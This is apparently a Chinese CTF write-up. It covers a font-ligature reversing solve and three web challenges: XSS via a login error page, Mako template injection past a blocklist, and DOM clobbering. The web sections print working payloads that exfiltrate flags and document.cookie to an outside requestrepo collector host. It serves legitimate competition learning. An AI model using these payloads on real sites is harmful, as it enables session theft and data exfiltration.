<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">Glyph Name -&gt; Unicode Characters</span><br><span class="line">space -&gt;   </span><br><span class="line">exclam -&gt; !</span><br><span class="line">quotedbl -&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">numbersign -&gt; #</span></span><br><span class="line"><span class="string">dollar -&gt; $</span></span><br><span class="line"><span class="string">percent -&gt; %</span></span><br><span class="line"><span class="string">ampersand -&gt; &amp;</span></span><br><span class="line"><span class="string">quotesingle -&gt; &#x27;</span></span><br><span class="line"><span class="string">parenleft -&gt; (</span></span><br><span class="line"><span class="string">parenright -&gt; )</span></span><br><span class="line"><span class="string">asterisk -&gt; *</span></span><br><span class="line"><span class="string">plus -&gt; +</span></span><br><span class="line"><span class="string">comma -&gt; ,</span></span><br><span class="line"><span class="string">hyphen -&gt; -­</span></span><br><span class="line"><span class="string">period -&gt; .</span></span><br><span class="line"><span class="string">slash -&gt; /</span></span><br><span class="line"><span class="string">zero -&gt; 0</span></span><br><span class="line"><span class="string">one -&gt; 1</span></span><br><span class="line"><span class="string">two -&gt; 2</span></span><br><span class="line"><span class="string">three -&gt; 3</span></span><br><span class="line"><span class="string">four -&gt; 4</span></span><br><span class="line"><span class="string">five -&gt; 5</span></span><br><span class="line"><span class="string">six -&gt; 6</span></span><br><span class="line"><span class="string">seven -&gt; 7</span></span><br><span class="line"><span class="string">eight -&gt; 8</span></span><br><span class="line"><span class="string">nine -&gt; 9</span></span><br><span class="line"><span class="string">colon -&gt; :</span></span><br><span class="line"><span class="string">semicolon -&gt; ;;</span></span><br><span class="line"><span class="string">less -&gt; &lt;</span></span><br><span class="line"><span class="string">equal -&gt; =</span></span><br><span class="line"><span class="string">greater -&gt; &gt;</span></span><br><span class="line"><span class="string">question -&gt; ?</span></span><br><span class="line"><span class="string">at -&gt; @</span></span><br><span class="line"><span class="string">A -&gt; A</span></span><br><span class="line"><span class="string">B -&gt; B</span></span><br><span class="line"><span class="string">C -&gt; C</span></span><br><span class="line"><span class="string">D -&gt; D</span></span><br><span class="line"><span class="string">E -&gt; E</span></span><br><span class="line"><span class="string">F -&gt; F</span></span><br><span class="line"><span class="string">G -&gt; G</span></span><br><span class="line"><span class="string">H -&gt; H</span></span><br><span class="line"><span class="string">I -&gt; I</span></span><br><span class="line"><span class="string">J -&gt; J</span></span><br><span class="line"><span class="string">K -&gt; K</span></span><br><span class="line"><span class="string">L -&gt; L</span></span><br><span class="line"><span class="string">M -&gt; M</span></span><br><span class="line"><span class="string">N -&gt; N</span></span><br><span class="line"><span class="string">O -&gt; O</span></span><br><span class="line"><span class="string">P -&gt; P</span></span><br><span class="line"><span class="string">Q -&gt; Q</span></span><br><span class="line"><span class="string">R -&gt; R</span></span><br><span class="line"><span class="string">S -&gt; S</span></span><br><span class="line"><span class="string">T -&gt; T</span></span><br><span class="line"><span class="string">U -&gt; U</span></span><br><span class="line"><span class="string">V -&gt; V</span></span><br><span class="line"><span class="string">W -&gt; W</span></span><br><span class="line"><span class="string">X -&gt; X</span></span><br><span class="line"><span class="string">Y -&gt; Y</span></span><br><span class="line"><span class="string">Z -&gt; Z</span></span><br><span class="line"><span class="string">bracketleft -&gt; [</span></span><br><span class="line"><span class="string">backslash -&gt; \</span></span><br><span class="line"><span class="string">bracketright -&gt; ]</span></span><br><span class="line"><span class="string">asciicircum -&gt; ^</span></span><br><span class="line"><span class="string">underscore -&gt; _</span></span><br><span class="line"><span class="string">grave -&gt; `</span></span><br><span class="line"><span class="string">a -&gt; a</span></span><br><span class="line"><span class="string">b -&gt; b</span></span><br><span class="line"><span class="string">c -&gt; c</span></span><br><span class="line"><span class="string">d -&gt; d</span></span><br><span class="line"><span class="string">e -&gt; e</span></span><br><span class="line"><span class="string">f -&gt; f</span></span><br><span class="line"><span class="string">g -&gt; g</span></span><br><span class="line"><span class="string">h -&gt; h</span></span><br><span class="line"><span class="string">i -&gt; i</span></span><br><span class="line"><span class="string">j -&gt; j</span></span><br><span class="line"><span class="string">k -&gt; k</span></span><br><span class="line"><span class="string">l -&gt; l</span></span><br><span class="line"><span class="string">m -&gt; m</span></span><br><span class="line"><span class="string">n -&gt; n</span></span><br><span class="line"><span class="string">o -&gt; o</span></span><br><span class="line"><span class="string">p -&gt; p</span></span><br><span class="line"><span class="string">q -&gt; q</span></span><br><span class="line"><span class="string">r -&gt; r</span></span><br><span class="line"><span class="string">s -&gt; s</span></span><br><span class="line"><span class="string">t -&gt; t</span></span><br><span class="line"><span class="string">u -&gt; u</span></span><br><span class="line"><span class="string">v -&gt; v</span></span><br><span class="line"><span class="string">w -&gt; w</span></span><br><span class="line"><span class="string">x -&gt; x</span></span><br><span class="line"><span class="string">y -&gt; y</span></span><br><span class="line"><span class="string">z -&gt; z</span></span><br><span class="line"><span class="string">braceleft -&gt; &#123;</span></span><br><span class="line"><span class="string">bar -&gt; |</span></span><br><span class="line"><span class="string">braceright -&gt; &#125;</span></span><br><span class="line"><span class="string">asciitilde -&gt; ~</span></span><br><span class="line"><span class="string">exclamdown -&gt; ¡</span></span><br><span class="line"><span class="string">cent -&gt; ¢</span></span><br><span class="line"><span class="string">sterling -&gt; £</span></span><br><span class="line"><span class="string">currency -&gt; ¤</span></span><br><span class="line"><span class="string">yen -&gt; ¥</span></span><br><span class="line"><span class="string">brokenbar -&gt; ¦</span></span><br><span class="line"><span class="string">section -&gt; §</span></span><br></pre></td></tr></table></figure>

<p>需要通过逆向联接来重建输入字符串，追溯每个字形的联接规则。通过递归反向映射，最终找出原始输入的字形。</p>
<p>通过递归展开目标字形，生成符合条件的字符串。利用深度优先搜索和备忘录，可以优化扩展，尽量避免指数级增长。如果是哈希树，应该只有一条学习路径，我们可以先测试。</p>
<p>为了避免过多生成，我们定义了一个 <code>expand(glyph)</code> 函数，它返回可能的字符串列表。通过深度优先搜索并结合约束限制，我们可以实现更有效的扩展。在展开时，只探索每对唯一的映射。我还考虑检查目标根字形的逆向路径复杂度，看是否只会有一条解构路径。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">arget=<span class="string">&#x27;O162e219bca79a462f9cf5701124cf74c&#x27;</span></span><br><span class="line"><span class="comment"># build reverse mapping</span></span><br><span class="line">rev = &#123;&#125;</span><br><span class="line">count_rules=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> lookup <span class="keyword">in</span> lookupList.Lookup:</span><br><span class="line">    <span class="keyword">if</span> lookup.LookupType!=<span class="number">4</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> lookup.SubTable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(st,<span class="string">&#x27;ligatures&#x27;</span>): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> start_glyph, lig_list <span class="keyword">in</span> st.ligatures.items():</span><br><span class="line">            <span class="keyword">for</span> lig <span class="keyword">in</span> lig_list:</span><br><span class="line">                <span class="comment"># only bigrams assumed</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(lig.Component)!=<span class="number">1</span>: </span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                a=start_glyph</span><br><span class="line">                b=lig.Component[<span class="number">0</span>] <span class="keyword">if</span> lig.Component <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">                c=lig.LigGlyph</span><br><span class="line">                rev.setdefault(c, []).append((a,b))</span><br><span class="line">                count_rules+=<span class="number">1</span></span><br><span class="line">count_rules, <span class="built_in">len</span>(rev[target]), rev[target][:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<p>输出得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(2091,  1,  [(&#x27;O0dd4bbd1dc3031e7985b2c4b2caee3b0&#x27;, &#x27;Od37ba43eb880c76fd73cf4d8044d97ad&#x27;)])</span><br></pre></td></tr></table></figure>

<p>只有一个逆向配对，表明存在唯一的路径，最终能够将其映射到ASCII。接下来，我将实现递归扩展，直到达到那些直接映射到Unicode字符（可能是ASCII）的叶子节点。停止条件是当两子节点都不在逆向映射键中时。</p>
<p>然后通过递归扩展收集叶子结点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sys.setrecursionlimit(<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_to_leaves</span>(<span class="params">g</span>):</span><br><span class="line">    <span class="comment"># returns list of leaf glyph names in order</span></span><br><span class="line">    <span class="keyword">if</span> g <span class="keyword">in</span> rev:</span><br><span class="line">        a,b = rev[g][<span class="number">0</span>]  <span class="comment"># assume unique</span></span><br><span class="line">        <span class="keyword">return</span> expand_to_leaves(a)+expand_to_leaves(b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [g]</span><br><span class="line">leaves = expand_to_leaves(target)</span><br><span class="line"><span class="built_in">len</span>(leaves), leaves[:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<p>得到(64, [‘one’, ‘f’, ‘eight’, ‘nine’, ‘a’, ‘nine’, ‘five’, ‘seven’, ‘a’, ‘zero’])</p>
<p>再按照mapping.txt的规则进行转换，有</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">leaf_to_char</span><span class="params">(name)</span>:</span></span><br><span class="line"><span class="function">    ch =</span> <span class="built_in">glyph_to_char</span>(name)</span><br><span class="line">    <span class="keyword">return</span> ch</span><br><span class="line">s=<span class="string">&#x27;&#x27;.join(leaf_to_char(n) for n in leaves)</span></span><br><span class="line"><span class="string">s, [ (n, leaf_to_char(n)) for n in leaves[:20] ]</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2&#x27;</span>,  [(<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;1&#x27;</span>),   (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;f&#x27;</span>),   (<span class="string">&#x27;eight&#x27;</span>, <span class="string">&#x27;8&#x27;</span>),   (<span class="string">&#x27;nine&#x27;</span>, <span class="string">&#x27;9&#x27;</span>),   (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>),   (<span class="string">&#x27;nine&#x27;</span>, <span class="string">&#x27;9&#x27;</span>),   (<span class="string">&#x27;five&#x27;</span>, <span class="string">&#x27;5&#x27;</span>),   (<span class="string">&#x27;seven&#x27;</span>, <span class="string">&#x27;7&#x27;</span>),   (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>),   (<span class="string">&#x27;zero&#x27;</span>, <span class="string">&#x27;0&#x27;</span>),   (<span class="string">&#x27;eight&#x27;</span>, <span class="string">&#x27;8&#x27;</span>),   (<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;1&#x27;</span>),   (<span class="string">&#x27;six&#x27;</span>, <span class="string">&#x27;6&#x27;</span>),   (<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;e&#x27;</span>),   (<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;3&#x27;</span>),   (<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>),   (<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;e&#x27;</span>),   (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>),   (<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;3&#x27;</span>),   (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;f&#x27;</span>)])</span><br></pre></td></tr></table></figure>

<p>最后flag即为TFCCTF{1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2}</p>
<p>询问gpt的思考过程：<a href="https://chatgpt.com/share/68b1b28f-6008-8000-8abd-c756c9e0b572">https://chatgpt.com/share/68b1b28f-6008-8000-8abd-c756c9e0b572</a></p>
<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="webless">WEBLESS</span><a href="#webless" class="header-anchor"></a></h2><blockquote>
<p>获得reffer似乎可行可行的思路</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;https://kws1oh3y.requestrepo.com:8000/collect?ref=$&#123;document.referrer&#125;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是题目禁止任何内联脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.<span class="property">headers</span>[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>密码错误也能导致xss,且没有安全头</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> UNAUTHORIZED</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/3.1.3 Python/3.12.11</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 30 Aug 2025 00:54:41 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1682</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>iframe 与父同域，iframe 似乎可获取父域dom?</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> parent = <span class="variable language_">window</span>.<span class="property">parent</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> iframe = parent.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> iframeDoc = iframe.<span class="property">contentDocument</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> flag = iframeDoc.<span class="title function_">getElementById</span>(<span class="string">&#x27;description&#x27;</span>).<span class="property">innerText</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://kws1oh3y.requestrepo.com/?flag=&#x27;</span>+flag)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/post/0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:0;height:0;border:0;visibility:hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">credentialless</span> <span class="attr">src</span>=<span class="string">&quot;/login?username=%3Cscript%3E%0Aconst%20parent%20%3D%20window%2Eparent%3B%0Aconst%20iframe%20%3D%20parent%2Edocument%2EgetElementById%28%27flag%27%29%3B%0Aconst%20iframeDoc%20%3D%20iframe%2EcontentDocument%3B%0Aconst%20flag%20%3D%20iframeDoc%2EgetElementById%28%27description%27%29%2EinnerText%3B%0Afetch%28%27https%3A%2F%2Fkws1oh3y%2Erequestrepo%2Ecom%2F%3Fflag%3D%27%2Bflag%29%0A%3C%2Fscript%3E&amp;password=admin&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:0;height:0;border:0;visibility:hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这在我的浏览器上成功了,但是为什么bot不行？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app-1  | 192.168.18.173 - - [30/Aug/2025 02:04:31] &quot;POST /report HTTP/1.1&quot; 202 -</span><br><span class="line">app-1  | 127.0.0.1 - - [30/Aug/2025 02:04:32] &quot;GET /login?username=27ffe8f85d20e7bae3ad45680567f64671a94b1a4708d96546dfb63788b84c6e&amp;password=fb1a60ff69b9d842b9bcba78b930baa0d8de1420b210453b527188125c405264 HTTP/1.1&quot; 302 -</span><br><span class="line">app-1  | 127.0.0.1 - - [30/Aug/2025 02:04:32] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">app-1  | 127.0.0.1 - - [30/Aug/2025 02:04:32] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line">app-1  | Login page fully loaded</span><br><span class="line">app-1  | Visiting: http://192.168.18.158:5000/post/12</span><br><span class="line">app-1  | 172.18.0.1 - - [30/Aug/2025 02:04:32] &quot;GET /post/12 HTTP/1.1&quot; 302 -</span><br><span class="line">app-1  | 172.18.0.1 - - [30/Aug/2025 02:04:32] &quot;GET /login HTTP/1.1&quot; 200 -</span><br><span class="line">app-1  | 172.18.0.1 - - [30/Aug/2025 02:04:32] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line">app-1  | [BOT] Error: Message: </span><br><span class="line">app-1  | </span><br><span class="line">app-1  | Browser closed.</span><br><span class="line">app-1  | [BOT] Done</span><br></pre></td></tr></table></figure>

<p>bot似乎没有加载iframe?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.get(f&quot;http://127.0.0.1:5000/login?username=&#123;username&#125;&amp;password=&#123;password&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>尝试提交127.0.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http%3a%2f%2f127.0.0.1%3a5000%2fpost%2f12</span><br></pre></td></tr></table></figure>

<p>成功！</p>
<h2><span id="kissfixess">KISSFIXESS</span><a href="#kissfixess" class="header-anchor"></a></h2><blockquote>
<p>存在模板注入</p>
</blockquote>
<p>用户输入在模板编译前被替换到模板源码中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Renders the HTML page with the given name.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>这里 <code>html_template</code> 是 Mako 模板源码字符串。将用户输入替换进 “NAME” 占位符发生在 Template(…) 编译之前。</li>
<li>Mako 会在编译阶段解析 ${…}（表达式）与以 % 开头的控制行（如 % if …:、% for …:）。</li>
</ul>
<blockquote>
<p>这些字符会在这之前被转义,意味着模板不会直接执行他们</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;转义HTML特殊字符，防止XSS等攻击&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>黑名单如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>但是似乎转义后的字符能带来 &amp; a m p ; l t g t # 4 0 1 , 这似乎有助于我们绕过waf</p>
<p>发现band被传进去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banned=&quot;&amp;&lt;&gt;()&quot;</span><br></pre></td></tr></table></figure>

<p>尝试构造如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;%c&#x27;</span>%<span class="number">60</span> + <span class="string">&#x27;%c&#x27;</span> % <span class="number">115</span> +<span class="string">&#x27;cript&#x27;</span> + banned[<span class="number">2</span>] + <span class="string">&#x27;fetch&#x27;</span> + banned[<span class="number">3</span>] + <span class="string">&#x27;`http&#x27;</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">115</span> + <span class="string">&#x27;://drzgmowg&#x27;</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">46</span> + <span class="string">&#x27;reque&#x27;</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">115</span> + <span class="string">&#x27;trepo&#x27;</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">46</span> + <span class="string">&#x27;com/?a=&#x27;</span> + <span class="string">&#x27;%c&#x27;</span> % <span class="number">36</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">123</span> + <span class="string">&#x27;document&#x27;</span> + <span class="string">&#x27;%c&#x27;</span>%<span class="number">46</span> + <span class="string">&#x27;cookie&#x27;</span> + <span class="string">&#x27;%c&#x27;</span> % <span class="number">125</span> + <span class="string">&#x27;`&#x27;</span> + banned[<span class="number">4</span>] + <span class="string">&#x27;%c&#x27;</span>%<span class="number">60</span> + <span class="string">&#x27;%c&#x27;</span> % <span class="number">47</span> + <span class="string">&#x27;%c&#x27;</span> % <span class="number">115</span> +<span class="string">&#x27;cript&#x27;</span> + banned[<span class="number">2</span>]&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="dom-notify">DOM NOTIFY</span><a href="#dom-notify" class="header-anchor"></a></h2><p>可能是DOM破坏?</p>
<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM clobbering | Web Security Academy</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=custom_elements&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">custom_elements</span> <span class="attr">name</span>=<span class="string">enabled</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">custom_elements</span> <span class="attr">name</span>=<span class="string">endpoint</span> <span class="attr">href</span>=<span class="string">//kws1oh3y.requestrepo.com</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

